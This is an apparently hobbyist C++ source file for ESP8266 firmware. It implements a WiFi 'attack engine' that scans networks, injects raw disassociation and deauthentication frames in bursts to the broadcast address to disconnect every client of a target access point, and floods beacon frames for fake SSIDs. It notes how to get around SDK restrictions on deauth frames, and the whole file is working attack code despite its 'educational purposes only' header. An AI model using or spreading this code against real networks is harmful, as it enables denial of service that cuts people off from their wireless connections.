// deauth_utils.cpp
// ESP8266 WiFi Attack Engine — Custom Implementation
// Ported from ESP32 wifi_utils.cpp
//
// KEY DIFFERENCE FROM ESP32:
//   ESP32:   esp_wifi_80211_tx(WIFI_IF_AP, packet, len, false)
//   ESP8266: wifi_send_pkt_freedom(packet, len, 0)
//
// The deauth frame structure is IDENTICAL — IEEE 802.11 is the same.
// Only the SDK function to inject raw frames changes between platforms.
//
// Educational purposes only — unauthorized use is ILLEGAL!

#include "deauth_utils.h"

// ============================================================
// ESP8266 SDK raw frame injection declarations
// These are NOT always in user_interface.h — must declare explicitly
// ============================================================
extern "C" {
  #include "user_interface.h"

  // Raw 802.11 frame injection (the key function)
  int wifi_send_pkt_freedom(uint8 *buf, int len, bool sys_seq);

  // Callback for TX status
  typedef void (*freedom_outside_cb_t)(uint8 status);
  int wifi_register_send_pkt_freedom_cb(freedom_outside_cb_t cb);
  void wifi_unregister_send_pkt_freedom_cb(void);

  // Promiscuous RX callback type
  typedef void (*wifi_promiscuous_cb_t)(uint8 *buf, uint16 len);
  void wifi_set_promiscuous_rx_cb(wifi_promiscuous_cb_t cb);
}

// ============================================================
// Promiscuous mode callback (required by ESP8266 SDK)
// Some SDK versions REQUIRE a callback to be set before
// enabling promiscuous mode, or wifi_send_pkt_freedom fails.
// ============================================================
static void promisc_cb(uint8_t *buf, uint16_t len) {
  // Intentionally empty — we only TX, not RX
}

// Track TX success for debugging
static volatile uint32_t txOK = 0;
static volatile uint32_t txFail = 0;

static void freedom_cb(uint8 status) {
  if (status == 0) txOK++;
  else txFail++;
}

// ============================================================
// Constructor
// ============================================================
DeauthEngine::DeauthEngine()
  : mode(ATK_IDLE),
    targetChannel(0),
    packetsSent(0),
    burstCount(0),
    lastBurstTime(0),
    scanResults(nullptr),
    scanCount(0)
{
  memset(targetBSSID, 0, 6);
}

// ============================================================
// WiFi Scanning
// ============================================================

int DeauthEngine::scanNetworks() {
  // Clean up previous scan
  if (scanResults != nullptr) {
    delete[] scanResults;
    scanResults = nullptr;
  }
  scanCount = 0;

  // Disable promiscuous + freedom CB before scanning
  wifi_promiscuous_enable(0);
  wifi_unregister_send_pkt_freedom_cb();

  WiFi.mode(WIFI_STA);
  WiFi.disconnect();
  delay(100);

  int n = WiFi.scanNetworks();
  if (n <= 0) return 0;

  scanCount = n;
  scanResults = new WiFiTarget[n];

  for (int i = 0; i < n; i++) {
    scanResults[i].ssid = WiFi.SSID(i);
    scanResults[i].bssid_str = WiFi.BSSIDstr(i);
    scanResults[i].channel = WiFi.channel(i);
    scanResults[i].rssi = WiFi.RSSI(i);

    // Parse BSSID string to bytes
    uint8_t* bssid = WiFi.BSSID(i);
    if (bssid != nullptr) {
      memcpy(scanResults[i].bssid, bssid, 6);
    }
  }

  WiFi.scanDelete();
  return n;
}

WiFiTarget DeauthEngine::getTarget(int index) {
  if (index >= 0 && index < scanCount && scanResults != nullptr) {
    return scanResults[index];
  }
  WiFiTarget empty;
  return empty;
}

int DeauthEngine::getNetworkCount() {
  return scanCount;
}

// ============================================================
// Enable Raw Frame Transmission
// ============================================================
// Spacehuhn-style initialization — proven to work on 2.7.4
// Key differences from our previous approach:
//   1. Use wifi_set_opmode() directly, NOT WiFi.softAP()
//   2. Set promisc callback BEFORE enabling
//   3. Set channel AFTER enabling promiscuous mode
// ============================================================

void DeauthEngine::enableRawTX() {
  // Reset TX counters
  txOK = 0;
  txFail = 0;

  // Disconnect everything first
  WiFi.disconnect();
  WiFi.mode(WIFI_OFF);
  delay(50);

  // Use raw SDK call — STATIONAP mode (not just AP)
  wifi_set_opmode(STATIONAP_MODE);
  delay(50);

  // Set promiscuous callback BEFORE enabling (required!)
  wifi_set_promiscuous_rx_cb(promisc_cb);

  // Enable promiscuous mode
  wifi_promiscuous_enable(1);
  delay(10);

  // Set channel AFTER promiscuous mode is enabled
  wifi_set_channel(targetChannel);
  delay(10);

  Serial.printf("[RAW TX] Enabled on ch %d (STATIONAP + promisc)\n", targetChannel);
}

// ============================================================
// Deauthentication Attack
// ============================================================

void DeauthEngine::startDeauth(uint8_t* bssid, uint8_t channel) {
  memcpy(targetBSSID, bssid, 6);
  targetChannel = channel;

  enableRawTX();

  mode = ATK_DEAUTH;
  packetsSent = 0;
  burstCount = 0;
  lastBurstTime = 0;

  Serial.printf("[DEAUTH] Target: %02X:%02X:%02X:%02X:%02X:%02X Ch:%d\n",
                bssid[0], bssid[1], bssid[2],
                bssid[3], bssid[4], bssid[5], channel);
}

void DeauthEngine::sendDeauthPacket(const uint8_t* bssid, const uint8_t* sta) {
  // FRAME 1: Disassociation (0xA0) — AP tells client to leave
  // Some SDK versions block 0xC0 (deauth) but allow 0xA0 (disassoc)
  uint8_t disassoc_frame[] = {
    0xA0, 0x00,                         // Frame control: Disassociation
    0x00, 0x00,                         // Duration
    sta[0], sta[1], sta[2], sta[3], sta[4], sta[5],         // Addr1: Dest
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // Addr2: Src (AP)
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // Addr3: BSSID
    0x00, 0x00,                         // Sequence control
    0x08, 0x00                          // Reason: Disassociated - STA has left
  };

  int ret1 = wifi_send_pkt_freedom(disassoc_frame, sizeof(disassoc_frame), false);

  // FRAME 2: Deauthentication (0xC0) — classic deauth
  uint8_t deauth_frame[] = {
    0xC0, 0x00,                         // Frame control: Deauth
    0x00, 0x00,                         // Duration
    sta[0], sta[1], sta[2], sta[3], sta[4], sta[5],         // Addr1: Dest
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // Addr2: Src (AP)
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5], // Addr3: BSSID
    0x00, 0x00,                         // Sequence control
    0x07, 0x00                          // Reason: Class 3 frame
  };

  int ret2 = wifi_send_pkt_freedom(deauth_frame, sizeof(deauth_frame), false);

  // FRAME 3: Deauth in reverse direction (client → AP)
  uint8_t deauth_reverse[] = {
    0xC0, 0x00,
    0x00, 0x00,
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    sta[0], sta[1], sta[2], sta[3], sta[4], sta[5],
    bssid[0], bssid[1], bssid[2], bssid[3], bssid[4], bssid[5],
    0x00, 0x00,
    0x07, 0x00
  };

  int ret3 = wifi_send_pkt_freedom(deauth_reverse, sizeof(deauth_reverse), false);

  // Debug: print return values ONCE
  if (packetsSent == 0) {
    Serial.printf("[TX TEST] Disassoc=0xA0: %d  Deauth=0xC0: %d  Reverse: %d  (0=OK)\n", ret1, ret2, ret3);
    Serial.printf("[TX TEST] Channel: %d  OpMode: %d\n", wifi_get_channel(), wifi_get_opmode());
  }

  packetsSent += 3;
}

void DeauthEngine::sendDeauthBurst(const uint8_t* bssid, const uint8_t* sta, int count) {
  for (int i = 0; i < count; i++) {
    sendDeauthPacket(bssid, sta);
    if (i < count - 1) {
      delay(BURST_DELAY_MS);
    }
  }
  burstCount++;
}

// ============================================================
// Beacon Flood Attack
// ============================================================
// Creates fake WiFi networks to confuse scanning devices.
// Each beacon packet advertises a fake SSID.
// ============================================================

void DeauthEngine::startBeaconFlood(const char* fakeName, uint8_t channel) {
  beaconSSID = String(fakeName);
  targetChannel = channel;

  enableRawTX();

  mode = ATK_BEACON;
  packetsSent = 0;
  burstCount = 0;
  lastBurstTime = 0;

  Serial.printf("[BEACON] Flooding SSID: '%s' on ch %d\n", fakeName, channel);
}

void DeauthEngine::sendBeaconPacket(const char* ssid, uint8_t channel) {
  int ssidLen = strlen(ssid);
  if (ssidLen > 32) ssidLen = 32;

  // Beacon frame template
  uint8_t beacon[] = {
    // Frame Control: Beacon
    0x80, 0x00,
    // Duration
    0x00, 0x00,
    // Destination: Broadcast
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF,
    // Source: Random fake MAC
    0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x00,
    // BSSID: Same as source
    0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x00,
    // Sequence control
    0x00, 0x00,
    // ---- Fixed Parameters (12 bytes) ----
    // Timestamp (8 bytes)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    // Beacon interval (2 bytes) = 100 TU
    0x64, 0x00,
    // Capability info (2 bytes) — 0x21 = ESS + Short Preamble (Open network)
    0x21, 0x04
  };

  // Randomize source MAC for each beacon
  beacon[10] = random(0, 256);
  beacon[11] = random(0, 256);
  beacon[16] = beacon[10];
  beacon[17] = beacon[11];

  // Build tagged parameters: SSID + Supported Rates + DS Channel
  uint8_t tagged[64];
  int pos = 0;

  // Tag: SSID
  tagged[pos++] = 0x00;        // Element ID = SSID
  tagged[pos++] = ssidLen;     // Length
  memcpy(tagged + pos, ssid, ssidLen);
  pos += ssidLen;

  // Tag: Supported Rates
  tagged[pos++] = 0x01;        // Element ID
  tagged[pos++] = 0x08;        // Length
  tagged[pos++] = 0x82; tagged[pos++] = 0x84;
  tagged[pos++] = 0x8B; tagged[pos++] = 0x96;
  tagged[pos++] = 0x24; tagged[pos++] = 0x30;
  tagged[pos++] = 0x48; tagged[pos++] = 0x6C;

  // Tag: DS Parameter Set (channel)
  tagged[pos++] = 0x03;        // Element ID
  tagged[pos++] = 0x01;        // Length
  tagged[pos++] = channel;     // Channel number

  // Assemble full packet
  int totalLen = sizeof(beacon) + pos;
  uint8_t packet[128];
  memcpy(packet, beacon, sizeof(beacon));
  memcpy(packet + sizeof(beacon), tagged, pos);

  wifi_send_pkt_freedom(packet, totalLen, 0);
  packetsSent++;
}

// ============================================================
// Attack Update Loop (call from loop())
// ============================================================

void DeauthEngine::update() {
  if (mode == ATK_IDLE) return;

  unsigned long now = millis();

  if (mode == ATK_DEAUTH) {
    if (now - lastBurstTime >= BURST_INTERVAL_MS) {
      lastBurstTime = now;

      // Broadcast deauth (kicks ALL clients)
      uint8_t broadcast[] = { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF };
      sendDeauthBurst(targetBSSID, broadcast, PKTS_PER_BURST);
    }
  }
  else if (mode == ATK_BEACON) {
    if (now - lastBurstTime >= 100) {  // Every 100ms = ~10 beacons/sec
      lastBurstTime = now;

      // Add random suffix to make unique SSIDs
      char name[33];
      snprintf(name, sizeof(name), "%s_%02X", beaconSSID.c_str(), (uint8_t)random(256));
      sendBeaconPacket(name, targetChannel);
    }
  }
}

// ============================================================
// Stop Attack
// ============================================================

void DeauthEngine::stop() {
  if (mode != ATK_IDLE) {
    Serial.printf("[STOP] %s — %lu packets, %lu bursts\n",
                  getModeName(), packetsSent, burstCount);
    Serial.printf("[TX DEBUG] OK=%lu  FAIL=%lu\n", txOK, txFail);
  }
  mode = ATK_IDLE;
  wifi_promiscuous_enable(0);
  wifi_unregister_send_pkt_freedom_cb();
  WiFi.mode(WIFI_STA);
}

// ============================================================
// Status
// ============================================================

bool DeauthEngine::isActive() { return mode != ATK_IDLE; }

const char* DeauthEngine::getModeName() {
  switch (mode) {
    case ATK_DEAUTH: return "DEAUTH";
    case ATK_BEACON: return "BEACON";
    default:         return "IDLE";
  }
}

unsigned long DeauthEngine::getPacketsSent() { return packetsSent; }
unsigned long DeauthEngine::getBurstCount()  { return burstCount; }

void DeauthEngine::parseBSSID(const char* str, uint8_t* out) {
  sscanf(str, "%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
         &out[0], &out[1], &out[2], &out[3], &out[4], &out[5]);
}
